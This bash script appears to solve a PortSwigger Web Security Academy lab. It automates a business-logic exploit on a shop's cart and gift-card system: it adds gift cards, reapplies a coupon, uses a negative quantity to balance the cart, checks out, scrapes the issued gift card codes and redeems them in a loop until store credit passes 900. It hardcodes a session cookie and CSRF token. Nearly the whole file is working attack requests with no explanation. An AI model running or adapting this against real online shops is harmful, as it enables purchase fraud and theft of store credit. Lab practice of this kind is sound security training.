#!/usr/bin/bash

## add i gift card
curl --path-as-is -i -s -k \
    -H $'Host: 0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Length: 36' -H $'Cache-Control: max-age=0' -H $'Sec-Ch-Ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: https://0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/product?productId=2' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=0, i' \
    -b $'session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
    --data-binary $'productId=2&redir=PRODUCT&quantity=1' \
    $'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart'
## apply the coupon
curl --path-as-is -i -s -k \
    -H $'Host: 0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Length: 53' -H $'Cache-Control: max-age=0' -H $'Sec-Ch-Ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: https://0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=0, i' \
    -b $'session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
    --data-binary $'csrf=kAWIsrAIWKG18ZV0rF6Wr8o4ZXPgv7WF&coupon=SIGNUP30' \
    $'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart/coupon'


# GET -> check the store credit
store_credit=$(curl -s 'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: max-age=0' \
  -H 'cookie: session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
  -H 'priority: u=0, i' \
  -H 'referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/my-account' \
  -H 'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' | grep -oP '<p><strong>Store credit: \$\K\d+\.\d{2}' | cut -d "." -f 1)

total=$(curl -s 'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: max-age=0' \
  -H 'cookie: session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
  -H 'priority: u=0, i' \
  -H 'referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/my-account' \
  -H 'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' | grep -A1 '<th>Total:</th>' | grep -oP '\d+\.\d{2}' | cut -d "." -f 1)



while (( store_credit < 900 )); do

    echo "start first while loop with $total & $store_credit"
    echo "==================================================="
    echo "   "
    while (( store_credit > total )); do
        # POST -> add gift card & apply coupon
        echo "start adding the gift card while loop $total & $store_credit";
        
        curl --path-as-is -i -s -k \
            -H $'Host: 0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Length: 36' -H $'Cache-Control: max-age=0' -H $'Sec-Ch-Ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: https://0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/product?productId=2' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=0, i' \
            -b $'session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
            --data-binary $'productId=2&redir=PRODUCT&quantity=6' \
            $'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart'

        store_credit=$(curl -s 'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart' \
                        -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
                        -H 'accept-language: en-US,en;q=0.9' \
                        -H 'cache-control: max-age=0' \
                        -H 'cookie: session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
                        -H 'priority: u=0, i' \
                        -H 'referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/my-account' \
                        -H 'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132"' \
                        -H 'sec-ch-ua-mobile: ?0' \
                        -H 'sec-ch-ua-platform: "Windows"' \
                        -H 'sec-fetch-dest: document' \
                        -H 'sec-fetch-mode: navigate' \
                        -H 'sec-fetch-site: same-origin' \
                        -H 'sec-fetch-user: ?1' \
                        -H 'upgrade-insecure-requests: 1' \
                        -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' | grep -oP '<p><strong>Store credit: \$\K\d+\.\d{2}' | cut -d "." -f 1)

        total=$(curl -s 'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart' \
                        -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
                        -H 'accept-language: en-US,en;q=0.9' \
                        -H 'cache-control: max-age=0' \
                        -H 'cookie: session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
                        -H 'priority: u=0, i' \
                        -H 'referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/my-account' \
                        -H 'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132"' \
                        -H 'sec-ch-ua-mobile: ?0' \
                        -H 'sec-ch-ua-platform: "Windows"' \
                        -H 'sec-fetch-dest: document' \
                        -H 'sec-fetch-mode: navigate' \
                        -H 'sec-fetch-site: same-origin' \
                        -H 'sec-fetch-user: ?1' \
                        -H 'upgrade-insecure-requests: 1' \
                        -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' | grep -A1 '<th>Total:</th>' | grep -oP '\d+\.\d{2}' | cut -d "." -f 1)
    done


    if (( store_credit < total )); then
       curl --path-as-is -i -s -k \
            -H $'Host: 0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Length: 36' -H $'Cache-Control: max-age=0' -H $'Sec-Ch-Ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: https://0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/product?productId=2' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=0, i' \
            -b $'session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
            --data-binary $'productId=2&redir=PRODUCT&quantity=-4' \
            $'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart'
    fi


    curl -s -L 'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart/checkout' \
                -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
                -H 'accept-language: en-US,en;q=0.9' \
                -H 'cache-control: max-age=0' \
                -H 'content-type: application/x-www-form-urlencoded' \
                -H 'cookie: session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
                -H 'origin: https://0a5000bc03de38318141997d001200ec.web-security-academy.net' \
                -H 'priority: u=0, i' \
                -H 'referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart' \
                -H 'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132"' \
                -H 'sec-ch-ua-mobile: ?0' \
                -H 'sec-ch-ua-platform: "Windows"' \
                -H 'sec-fetch-dest: document' \
                -H 'sec-fetch-mode: navigate' \
                -H 'sec-fetch-site: same-origin' \
                -H 'sec-fetch-user: ?1' \
                -H 'upgrade-insecure-requests: 1' \
                -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' \
                --data-raw 'csrf=kAWIsrAIWKG18ZV0rF6Wr8o4ZXPgv7WF' | grep -oP '<td>\K[a-zA-Z0-9]{10}(?=</td>)' > temp.txt
        echo "  "
        echo "  "
        echo "  "
        echo "  "
        cat ./temp.txt

    # REDEEEM THE THE GIFTS
        for i in $(cat ./temp.txt); do
            curl --path-as-is -i -s -k \
                -H $'Host: 0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Length: 58' -H $'Cache-Control: max-age=0' -H $'Sec-Ch-Ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: https://0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/my-account?id=wiener' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=0, i' \
                -b $'session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
                --data-binary $"csrf=kAWIsrAIWKG18ZV0rF6Wr8o4ZXPgv7WF&gift-card=$i" \
                $'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/gift-card'
        done

        curl --path-as-is -i -s -k \
            -H $'Host: 0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Length: 36' -H $'Cache-Control: max-age=0' -H $'Sec-Ch-Ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: https://0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/product?productId=2' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=0, i' \
            -b $'session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
            --data-binary $'productId=2&redir=PRODUCT&quantity=1' \
            $'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart'
        ## apply the coupon
        curl --path-as-is -i -s -k \
            -H $'Host: 0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Length: 53' -H $'Cache-Control: max-age=0' -H $'Sec-Ch-Ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: https://0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=0, i' \
            -b $'session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
            --data-binary $'csrf=kAWIsrAIWKG18ZV0rF6Wr8o4ZXPgv7WF&coupon=SIGNUP30' \
            $'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart/coupon'



        store_credit=$(curl -s 'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart' \
                        -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
                        -H 'accept-language: en-US,en;q=0.9' \
                        -H 'cache-control: max-age=0' \
                        -H 'cookie: session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
                        -H 'priority: u=0, i' \
                        -H 'referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/my-account' \
                        -H 'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132"' \
                        -H 'sec-ch-ua-mobile: ?0' \
                        -H 'sec-ch-ua-platform: "Windows"' \
                        -H 'sec-fetch-dest: document' \
                        -H 'sec-fetch-mode: navigate' \
                        -H 'sec-fetch-site: same-origin' \
                        -H 'sec-fetch-user: ?1' \
                        -H 'upgrade-insecure-requests: 1' \
                        -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' | grep -oP '<p><strong>Store credit: \$\K\d+\.\d{2}' | cut -d "." -f 1)

        total=$(curl -s 'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/cart' \
                        -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
                        -H 'accept-language: en-US,en;q=0.9' \
                        -H 'cache-control: max-age=0' \
                        -H 'cookie: session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
                        -H 'priority: u=0, i' \
                        -H 'referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/my-account' \
                        -H 'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132"' \
                        -H 'sec-ch-ua-mobile: ?0' \
                        -H 'sec-ch-ua-platform: "Windows"' \
                        -H 'sec-fetch-dest: document' \
                        -H 'sec-fetch-mode: navigate' \
                        -H 'sec-fetch-site: same-origin' \
                        -H 'sec-fetch-user: ?1' \
                        -H 'upgrade-insecure-requests: 1' \
                        -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' | grep -A1 '<th>Total:</th>' | grep -oP '\d+\.\d{2}' | cut -d "." -f 1)
                    
done